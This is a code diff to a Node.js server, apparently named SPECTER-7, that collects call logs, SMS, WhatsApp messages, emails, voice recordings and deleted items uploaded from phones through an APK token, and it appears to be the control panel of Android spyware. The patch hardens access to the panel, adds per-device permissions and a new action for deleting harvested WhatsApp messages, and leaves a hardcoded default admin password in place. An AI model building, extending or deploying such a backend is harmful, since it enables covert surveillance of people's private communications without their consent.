@@ -40,6 +40,19 @@ const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'specter2024';
 const SESSION_DURATION = 7 * 24 * 60 * 60 * 1000;
 const activeSessions = new Map();
 
+// ✅ cleanup دوري للـ sessions (memory leak fix)
+setInterval(() => {
+    const now = Date.now();
+    let cleaned = 0;
+    for (const [token, session] of activeSessions.entries()) {
+        if (now > session.expires) {
+            activeSessions.delete(token);
+            cleaned++;
+        }
+    }
+    if (cleaned > 0) console.log(`[AUTH] Cleaned ${cleaned} expired sessions`);
+}, 60 * 60 * 1000);
+
 // ═══════════════════════════════════════════════════════
 // 🔐 APK TOKEN
 // ═══════════════════════════════════════════════════════
@@ -71,12 +84,39 @@ function generateToken() {
 }
 
 // ═══════════════════════════════════════════════════════
-// SSE
+// 🔒 File lock for devices.json (race fix)
+// ═══════════════════════════════════════════════════════
+let devicesLock = false;
+
+// ═══════════════════════════════════════════════════════
+// SSE — ✅ محدّث مع auth
 // ═══════════════════════════════════════════════════════
 const sseClients = {};
 
 app.get('/events.php', (req, res) => {
+    // ✅ auth check
+    const token = req.query.token || req.headers['x-auth-token'];
+    const session = token ? activeSessions.get(token) : null;
+
+    if (!session || Date.now() > session.expires) {
+        return res.status(401).send('Unauthorized');
+    }
+
     const deviceId = req.query.device || 'all';
+
+    // ✅ غير الـ owner ما يشوف 'all'
+    if (!session.isOwner && deviceId === 'all') {
+        return res.status(403).send('Forbidden');
+    }
+
+    // ✅ تحقق من الصلاحية على الجهاز
+    if (!session.isOwner && deviceId !== 'all') {
+        const perms = loadPerms();
+        const allowed = perms[deviceId] || [];
+        if (!allowed.includes(session.fp)) {
+            return res.status(403).send('Forbidden');
+        }
+    }
 
     res.setHeader('Content-Type', 'text/event-stream');
     res.setHeader('Cache-Control', 'no-cache');
@@ -222,7 +262,6 @@ app.get('/auth/devices', (req, res) => {
         if (!session || Date.now() > session.expires) {
             return res.status(401).json({ error: 'Unauthorized' });
         }
-
         if (!session.isOwner) {
             return res.status(403).json({ error: 'Forbidden - Owner only' });
         }
@@ -706,7 +745,6 @@ app.post('/upload.php', (req, res) => {
                     if (!seen.has(key)) { seen.add(key); unique.push(c); }
                 }
                 unique.sort((a, b) => (b.date || 0) - (a.date || 0));
-                // ✅ احتفظ بآخر 2000 مكالمة
                 existingData.call_logs = unique.slice(0, 2000);
             }
 
@@ -720,7 +758,6 @@ app.post('/upload.php', (req, res) => {
                     if (!seen.has(key)) { seen.add(key); unique.push(s); }
                 }
                 unique.sort((a, b) => (b.date || 0) - (a.date || 0));
-                // ✅ احتفظ بآخر 2000 رسالة
                 existingData.sms = unique.slice(0, 2000);
 
                 data.data.sms.forEach(sms => {
@@ -866,7 +903,7 @@ app.get('/live.php', (req, res) => {
 });
 
 // ═══════════════════════════════════════════════════════
-// GET /api.php — مع دعم APK token
+// GET /api.php
 // ═══════════════════════════════════════════════════════
 app.get('/api.php', (req, res) => {
     try {
@@ -887,7 +924,7 @@ app.get('/api.php', (req, res) => {
             }
 
             if (!session.isOwner) {
-                const ownerOnlyActions = ['delete_device', 'clear_deleted', 'delete_deleted_item', 'delete_whatsapp_chat', 'delete_email', 'delete_voice', 'clear_voices', 'clear_whatsapp'];
+                const ownerOnlyActions = ['delete_device', 'clear_deleted', 'delete_deleted_item', 'delete_whatsapp_chat', 'delete_whatsapp', 'clear_whatsapp', 'delete_email', 'delete_voice', 'clear_voices'];
                 if (ownerOnlyActions.includes(action)) {
                     return res.status(403).json({ error: 'Forbidden - Owner only' });
                 }
@@ -942,6 +979,7 @@ app.get('/api.php', (req, res) => {
             return res.json([]);
         }
 
+        // ✅ حذف دردشة كاملة
         if (action === 'delete_whatsapp_chat') {
             const sender = req.query.sender;
             const waFile = path.join(dataDir, deviceId, 'whatsapp_messages.json');
@@ -954,15 +992,28 @@ app.get('/api.php', (req, res) => {
             return res.json({ success: false });
         }
 
+        // ✅ NEW: حذف رسائل محددة بالـ timestamp
+        if (action === 'delete_whatsapp') {
+            const timestamps = (req.query.timestamps || '').split(',').map(t => t.trim()).filter(t => t);
+            const waFile = path.join(dataDir, deviceId, 'whatsapp_messages.json');
+            if (fs.existsSync(waFile) && timestamps.length > 0) {
+                let messages = JSON.parse(fs.readFileSync(waFile, 'utf8'));
+                const before = messages.length;
+                messages = messages.filter(m => !timestamps.includes(String(m.timestamp)));
+                fs.writeFileSync(waFile, JSON.stringify(messages, null, 2));
+                console.log(`[WA] Deleted ${before - messages.length} messages for device=${deviceId}`);
+                return res.json({ success: true, deleted: before - messages.length });
+            }
+            return res.json({ success: false });
+        }
+
         if (action === 'get_whatsapp') {
             const waFile = path.join(dataDir, deviceId, 'whatsapp_messages.json');
             if (fs.existsSync(waFile)) return res.json(JSON.parse(fs.readFileSync(waFile, 'utf8')));
             return res.json([]);
         }
 
-        // ═══════════════════════════════════════════════════
-        // ✅ NEW: clear_whatsapp — مسح كل رسائل واتساب
-        // ═══════════════════════════════════════════════════
+        // ✅ مسح كل رسائل واتساب
         if (action === 'clear_whatsapp') {
             const waFile = path.join(dataDir, deviceId, 'whatsapp_messages.json');
             if (fs.existsSync(waFile)) {
@@ -970,7 +1021,6 @@ app.get('/api.php', (req, res) => {
                 console.log(`[CLEAR] WhatsApp cleared for device=${deviceId}`);
                 return res.json({ success: true });
             }
-            // لو الملف ما موجود، أنشئه فاضي
             const deviceDir = path.join(dataDir, deviceId);
             if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
             fs.writeFileSync(waFile, '[]');
@@ -1108,7 +1158,7 @@ app.get('/api.php', (req, res) => {
 });
 
 // ═══════════════════════════════════════════════════════
-// POST /api.php — مع دعم APK token
+// POST /api.php
 // ═══════════════════════════════════════════════════════
 app.post('/api.php', (req, res) => {
     try {
@@ -1175,24 +1225,31 @@ app.get('/devices.json', (req, res) => {
     }
 });
 
+// ✅ محدّث: lock لمنع race
 function updateDevicesList(deviceId, deviceInfo) {
-    let devices = [];
-    if (fs.existsSync(devicesFile)) devices = JSON.parse(fs.readFileSync(devicesFile, 'utf8'));
-    const index = devices.findIndex(d => d.id === deviceId);
-    if (index >= 0) {
-        devices[index].last_seen = Math.floor(Date.now()/1000);
-        if (deviceInfo && deviceInfo.model) {
-            devices[index].name = `${deviceInfo.brand || ''} ${deviceInfo.model}`.trim();
+    while (devicesLock) { /* spin */ }
+    devicesLock = true;
+    try {
+        let devices = [];
+        if (fs.existsSync(devicesFile)) devices = JSON.parse(fs.readFileSync(devicesFile, 'utf8'));
+        const index = devices.findIndex(d => d.id === deviceId);
+        if (index >= 0) {
+            devices[index].last_seen = Math.floor(Date.now()/1000);
+            if (deviceInfo && deviceInfo.model) {
+                devices[index].name = `${deviceInfo.brand || ''} ${deviceInfo.model}`.trim();
+            }
+        } else {
+            devices.push({
+                id: deviceId,
+                name: deviceInfo && deviceInfo.model ? `${deviceInfo.brand || ''} ${deviceInfo.model}`.trim() : deviceId,
+                first_seen: Math.floor(Date.now()/1000),
+                last_seen: Math.floor(Date.now()/1000)
+            });
         }
-    } else {
-        devices.push({
-            id: deviceId,
-            name: deviceInfo && deviceInfo.model ? `${deviceInfo.brand || ''} ${deviceInfo.model}`.trim() : deviceId,
-            first_seen: Math.floor(Date.now()/1000),
-            last_seen: Math.floor(Date.now()/1000)
-        });
+        fs.writeFileSync(devicesFile, JSON.stringify(devices, null, 2));
+    } finally {
+        devicesLock = false;
     }
-    fs.writeFileSync(devicesFile, JSON.stringify(devices, null, 2));
 }
 
 app.listen(PORT, () => console.log(`SPECTER-7 running on ${PORT}`));
